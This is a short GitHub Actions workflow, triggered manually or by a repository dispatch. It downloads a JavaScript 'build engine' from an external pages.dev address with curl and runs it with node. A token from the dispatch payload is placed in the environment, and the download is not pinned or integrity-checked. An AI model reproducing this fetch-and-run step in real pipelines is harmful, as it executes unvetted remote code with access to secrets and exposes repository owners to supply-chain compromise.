name: Dynamic Orchestration Pipeline

on:
  # Allows manual triggering from GitHub Actions UI
  workflow_dispatch:

  # Allows triggering through GitHub repository_dispatch API
  repository_dispatch:
    types: [deploy_to_cloudflare]

jobs:
  execute-engine:
    runs-on: ubuntu-latest

    steps:
      # Step 1: Checkout client data repository
      - name: Checkout Repository Assets
        uses: actions/checkout@v4

      # Step 2: Setup Node.js
      - name: Setup Runtime Architecture
        uses: actions/setup-node@v4
        with:
          node-version: "22"

      # Step 3: Fetch and execute remote build engine
      - name: Fetch and Execute Remote Build Engine
        env:
          AUTH_TOKEN: ${{ github.event.client_payload.token }}

        run: |
          echo "📡 Connecting to your secure cloud framework grid..."

          echo "⚡ Fetching build engine..."

          curl -s --fail \
            "https://buildfiles.pages.dev/actions-build.js" \
            -o build.js

          echo "⚡ Executing build engine..."

          node build.js
